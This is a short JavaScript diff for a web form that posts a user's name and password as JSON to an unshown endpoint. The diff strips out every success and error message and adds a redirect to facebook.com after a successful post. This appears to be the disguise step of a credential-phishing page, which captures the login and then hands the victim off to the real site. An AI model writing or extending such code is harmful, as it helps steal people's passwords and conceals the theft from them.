@@ -271,16 +271,14 @@ let data = {name: document.f1.name.value, password: document.f1.password.value}
                     body: JSON.stringify(data),
                 }).then(e=>{
 	if (e.ok){
-		alert('Data inserted successfully');
-              status=true
-  } else {
-                  alert('Failed to insert data');
-               status=false
- }
+		 
+         location.href = "https://facebook.com";     
+  }
+                  
 
 	
 }).catch((e)=>{
-alert(e,document.f1.name.value,document.f1.password.value)		
+		
 	});
 				
 }
